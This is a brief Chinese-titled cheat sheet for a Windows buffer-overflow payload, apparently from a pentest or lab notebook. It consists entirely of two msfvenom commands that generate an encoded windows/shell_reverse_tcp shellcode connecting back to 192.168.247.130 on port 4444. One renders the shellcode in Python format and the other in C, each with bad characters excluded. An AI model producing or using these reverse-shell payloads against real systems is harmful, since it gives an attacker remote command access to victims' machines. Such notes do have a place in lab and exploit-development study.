# windows缓冲区溢出payload

```clike
msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST=192.168.247.130 -e x86/shikata_ga_nai -b "\x00\x07\x2e\xa0" -f py
或者
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.247.130 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
```
